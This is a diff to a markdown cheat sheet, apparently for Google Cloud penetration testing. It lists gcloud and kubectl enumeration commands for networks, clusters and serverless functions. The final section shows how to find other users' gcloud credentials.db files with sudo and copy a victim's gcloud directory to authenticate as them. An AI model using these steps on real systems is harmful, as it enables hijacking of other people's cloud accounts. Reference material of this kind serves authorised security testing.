@@ -74,4 +74,45 @@
 
 ### Networking
 
+ - gcloud compute networks list (List networks)
+
+ - gcloud compute networks subnets list (List subnets)
+
+ - gcloud compute vpn-tunnels list (List VPN tunnels)
+
+ - gcloud compute interconnects list (List Interconnects (VPN)
+
+### Containers
+
+ - gcloud container clusters list
+
+### GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with gcloud and run:
+
+ - gcloud container clusters get-credentials CLUSTER_NAME --region REGION
+
+### If successful and the user has the correct permission the Kubernetes command below can be used to get cluster info:
+
+ - kubectl cluster-info
+
+### Serverless
+
+#### GCP functions log analysis – May get useful information from logs associated with GCP functions
+
+ - gcloud functions list
+
+ - gcloud functions describe FUNCTION_NAME
+
+ - gcloud functions logs read FUNCTION_NAME --limit NUMBER_OF_LINES
+
+### Gcloud stores creds in ~/.config/gcloud/credentials.db Search home directories
+
+ - sudo find /home -name "credentials.db
+
+### Copy gcloud dir to your own home directory to auth as the compromised user
+
+ - sudo cp -r /home/username/.config/gcloud ~/.config
+
+ - sudo chown -R currentuser:currentuser ~/.config/gcloud
+
+ - gcloud auth list
 
